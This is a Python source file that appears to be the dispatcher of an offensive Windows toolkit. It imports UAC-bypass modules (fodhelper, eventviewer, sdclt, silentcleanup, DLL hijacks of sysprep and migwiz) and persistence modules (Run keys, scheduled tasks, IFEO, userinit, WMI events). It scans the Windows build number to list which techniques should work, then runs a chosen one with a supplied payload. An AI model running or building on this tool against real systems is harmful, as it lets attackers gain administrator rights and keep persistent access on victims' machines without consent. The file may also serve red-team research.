import os
from prints import *
from utils import *
from functions.uac_runas import *
from functions.uac_slui import *
from functions.uac_perfmon import *
from functions.uac_fodhelper import *
from functions.uac_eventviewer import *
from functions.uac_sdcltcontrol import *
from functions.uac_silentcleanup import *
from functions.uac_compmgmtlauncher import *
from functions.uac_computerdefaults import *
from functions.uac_sdcltisolatedcommand import *
from functions.uac_dll_sysprep import *
from functions.uac_dll_cliconfg import *
from functions.uac_dll_mcx2prov import *
from functions.uac_dll_migwiz import *
from functions.persist_userinit import *
from functions.persist_schtask import *
from functions.persist_ifeo import *
from functions.persist_hkcu_run import *
from functions.persist_hklm_run import *
from functions.persist_dll_explorer import *
from functions.persist_wmievent import *

functions = (runas_info,fodhelper_info,slui_info,silentcleanup_info,sdcltisolatedcommand_info,sdcltcontrol_info,perfmon_info,eventviewer_info,compmgmtlauncher_info,computerdefaults_info,cliconfg_info,mcx2prov_info,migwiz_info,sysprep_info,explorer_info,wmievent_info,schtask_info,ifeo_info,userinit_info,hklmrun_info,hkcurun_info)

class scanner():
	def start(self):
		print_table()
		for info in (functions):
			if int(information().build_number()) < int(info["Fixed In"]) and int(information().build_number()) > int(info["Works From"]):
				table_success(info["Id"],
						"\t{}\t{}\t\t{}\t\t{}".format(str(info["Type"]),
						str(info["Function Payload"]),
						str(info["Admin"]),
						str(info["Description"])))
			else:
				table_error(info["Id"],
						"\t{}\t{}\t\t{}\t\t{}".format(str(info["Type"]),
						str(info["Function Payload"]),
						str(info["Admin"]),
						str(info["Description"])))

class function():
	def run(self,id,payload):
		print_info("Attempting to run id ({}) configured with payload ({})".format(id,payload))
		for info in (functions):
			if (id in str(info["Id"])):
				globals()[info["Function Name"]](os.path.join(payload))
			else:
				pass
